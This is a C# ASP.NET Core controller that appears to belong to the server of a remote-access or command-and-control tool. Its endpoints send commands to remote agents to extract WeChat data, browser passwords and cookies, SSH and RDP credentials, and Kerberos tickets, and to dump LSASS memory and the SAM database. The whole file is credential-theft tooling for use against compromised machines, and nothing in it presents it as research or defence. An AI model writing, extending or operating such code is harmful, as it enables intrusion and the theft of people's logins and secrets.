using System.Text.Json;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/othersoft")]
[Authorize]
public class OtherSoftController : ControllerBase
{
    private readonly RelayService _relay;

    public OtherSoftController(RelayService relay)
    {
        _relay = relay;
    }

    private async Task<IActionResult> RelayAndWaitAsync(string agentId, string messageType, object? data, CancellationToken ct, int timeoutSeconds = 30)
    {
        var response = await _relay.RelayAndWaitAsync(agentId, messageType, data, ct, TimeSpan.FromSeconds(timeoutSeconds));
        if (response == null)
            return StatusCode(504, new { error = "Agent did not respond in time." });
        return response.Data != null
            ? Content(response.Data.Value.GetRawText(), "application/json")
            : Ok(new { status = "ok" });
    }

    [HttpPost("{agentId}/wechat")]
    public async Task<IActionResult> GetWeChat(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.wechat", null, ct);
    }

    [HttpPost("{agentId}/browser")]
    public async Task<IActionResult> GetBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "passwords" : "passwords";
        var offset = body.TryGetProperty("offset", out var o) ? o.GetInt32() : 0;
        var limit = body.TryGetProperty("limit", out var l) ? l.GetInt32() : 250;
        var timeout = type == "cookies" ? 60 : 30;
        return await RelayAndWaitAsync(agentId, "othersoft.browser", new { type, offset, limit }, ct, timeout);
    }

    [HttpPost("{agentId}/browser/search")]
    public async Task<IActionResult> SearchBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "all" : "all";
        var keyword = body.TryGetProperty("keyword", out var k) ? k.GetString() ?? "" : "";
        if (string.IsNullOrWhiteSpace(keyword))
            return BadRequest(new { error = "keyword is required" });
        return await RelayAndWaitAsync(agentId, "othersoft.browser.search", new { type, keyword }, ct, 60);
    }

    [HttpPost("{agentId}/ssh")]
    public async Task<IActionResult> GetSSH(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.ssh", null, ct, 20);
    }

    [HttpPost("{agentId}/rdp")]
    public async Task<IActionResult> GetRDP(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.rdp", null, ct, 30);
    }

    [HttpPost("{agentId}/lsass")]
    public async Task<IActionResult> DumpLsass(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var path = body.TryGetProperty("path", out var p) ? p.GetString() ?? "" : "";
        return await RelayAndWaitAsync(agentId, "othersoft.lsass",
            string.IsNullOrEmpty(path) ? null : new { path }, ct, 60);
    }

    [HttpPost("{agentId}/klist")]
    public async Task<IActionResult> Klist(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.klist", null, ct, 30);
    }

    [HttpPost("{agentId}/sam")]
    public async Task<IActionResult> SaveSam(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var dir = body.TryGetProperty("dir", out var d) ? d.GetString() ?? "" : "";
        return await RelayAndWaitAsync(agentId, "othersoft.sam",
            string.IsNullOrEmpty(dir) ? null : new { dir }, ct, 30);
    }

}
